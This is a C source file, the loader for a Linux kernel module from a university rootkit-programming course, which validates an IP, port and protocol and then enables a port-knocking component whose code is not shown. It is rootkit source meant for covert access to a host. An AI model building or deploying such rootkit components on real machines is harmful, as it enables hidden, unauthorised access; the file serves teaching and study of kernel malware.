/*
 * Rootkit for the course Rootkit Programming at TUM in WS2014/15.
 * Implemented by Guru Chandrasekhara and Martin Herrmann.
 */
#include <linux/kernel.h>
#include <linux/inet.h>

#include "include.h"
#include "main.h"
#include "port_knocking.h"

/*
 * module parameters  
 * IP address and port number
 */
static char input_ip[16]; 
module_param_string(ipv4, input_ip, 16, 0);
static int port = -1;
module_param(port, int, 0);
static char protocol[4];
module_param_string(protocol, protocol, 4, 0);

/*
 * Function called when loading the kernel module.
 * Prints a welcome-message and then does its magic.
 */
int init_module (void)
{	
	u8 dst[4];
	int prot, ret;

	ROOTKIT_DEBUG("Loading port-knocker LKM...\n");
	
	/* ensure the input contains a valid ipv4 address */
	ret = in4_pton(input_ip, -1, dst, -1, NULL);
	if(ret == 0) {
		ROOTKIT_DEBUG("Invalid IP-address.\n");
		return -EINVAL;
	}

	/* ensure the input contains a valid port */
	if(port < 0 || port > 65535) {
		ROOTKIT_DEBUG("Invalid or missing port number.\n");
		return -EINVAL;
	}

	/* ensure a supported transport layer protocol is selected in the input */
	if(strcmp(protocol, "tcp") == 0) {
		prot = PROTO_TCP ;
	} else if(strcmp(protocol, "udp") == 0) {
		prot = PROTO_UDP ;
	} else {
		ROOTKIT_DEBUG("Unsupported transport layer protocol.\n");
		return -EINVAL;
	}
	
	ret = load_port_knocking(input_ip, (unsigned) port, prot);
	if(ret < 0) {
		ROOTKIT_DEBUG("Error while loading port knocking");
		return ret;
	}
	
	ROOTKIT_DEBUG("Sucessfully loaded the LKM!\n");
	return 0;
}

/*
 * Function called when unloading the kernel module.
 * Prints a goodbye-message and restores the kernel to its
 * original form.
 */
void cleanup_module (void)
{
	ROOTKIT_DEBUG("Starting to unload...\n");


	unload_port_knocking();
	
	/* Finally, log the unloading */
	ROOTKIT_DEBUG("Done. Bye!\n");
}
